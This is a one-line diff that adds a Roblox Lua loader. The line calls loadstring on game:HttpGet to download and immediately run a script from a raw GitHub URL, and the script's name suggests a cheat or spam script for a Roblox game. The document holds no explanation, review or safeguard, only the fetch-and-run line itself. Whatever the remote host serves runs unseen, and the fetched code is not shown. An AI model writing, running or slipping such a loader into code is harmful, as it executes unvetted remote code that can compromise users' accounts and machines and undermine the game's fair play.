@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/partsoapmakerremain/loaders/main/loaders/upd-paint-to-get-rich-spam6-3vp63oi4gqe4ra.lua"))()
